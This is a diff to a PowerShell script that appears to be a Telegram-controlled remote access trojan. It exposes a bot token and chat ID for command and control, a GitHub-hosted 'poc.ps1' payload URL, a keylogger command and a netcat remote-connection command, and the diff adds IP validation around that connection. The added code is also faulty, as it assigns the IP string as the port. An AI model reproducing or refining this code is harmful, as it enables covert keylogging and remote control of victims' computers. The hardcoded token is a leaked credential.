@@ -23,7 +23,7 @@ $PSDefaultParameterValues['Invoke-WebRequest:UseBasicParsing'] = $true
 $BotToken = "6630869064:AAHFU-v8wHKuMjNhhED-Z967JUcRTSM86tM"
 $ChatID = '5197803637'
 $githubScript = 'https://raw.githubusercontent.com/codexpuz/lol/main/poc.ps1'
-
+$ipv4Regex = '^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
 
 ###############
 ## FUNCTIONS ##
@@ -733,9 +733,15 @@ While ($DoNotExit)  {
         keylogger seconds $time
       }
       "/nc $ipV4 *"{
-        $ip = ($LastMessageText -split ("/nc $ipV4 "))[1]
-        $port = ($LastMessageText -split ("/nc $ipV4 "))[2]
-        netcat $ip $port
+        $ip = ($LastMessageText -split "/nc $ipV4 ")[1]
+
+        if ($ip -match $ipv4Regex) {
+            $port = $ip -replace '\s*$', ''
+            netcat $ip $port
+        } else {
+            Write-Host "Invalid IPv4 address format."
+	    Write-Host "$LastMessageText"
+        }
       }
       "/stopnc $ipV4"{
         stopnetcat
